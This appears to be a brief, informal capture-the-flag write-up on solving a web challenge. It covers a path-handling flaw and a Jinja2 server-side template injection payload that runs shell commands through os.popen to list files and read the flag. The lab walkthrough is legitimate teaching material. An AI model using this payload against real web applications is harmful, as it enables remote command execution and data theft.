Well 1st of all, i did read up somethifn to figure out that there was a DEFAULT templates directory 

![image](https://github.com/user-attachments/assets/6b2093c8-933d-44b3-b748-0b68306ccb44)
Nice page, well talking about page, nice varuable up there too. It seem like its defines what to render on the home.html page. 

Nope, no path traversal helped.... It just renders the defualt home.html page

![image](https://github.com/user-attachments/assets/de1f5f60-249b-4ea8-a289-3f3811f0890e)

![image](https://github.com/user-attachments/assets/421e1ecf-b252-4218-85b7-43ee3e2cb9b7)

![image](https://github.com/user-attachments/assets/bbfa3a68-0d2e-465f-8050-57bb381dca0a)

Turns out this section of the code is quite vulnerable and absolute path will for whatever reason have more priority over relative path. so yea the file is in, now what?


![image](https://github.com/user-attachments/assets/7fcbeb03-43ef-4e00-8797-a3d8ee15c7d9)

Here is where is gets funny, deepseek will explain =) 

```<textarea type="text" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</textarea>```

![image](https://github.com/user-attachments/assets/dd22870d-b798-4c38-9e8e-edee4c4accbe)

And twe get the output of the payload? template? 

![image](https://github.com/user-attachments/assets/8aa94673-861a-46b3-a5d6-520a2ec74b8c)


and nowe just change the command to ```cat flag.txt``` and done 

![image](https://github.com/user-attachments/assets/2759fbd8-cd32-447d-ac98-08413663e70c)





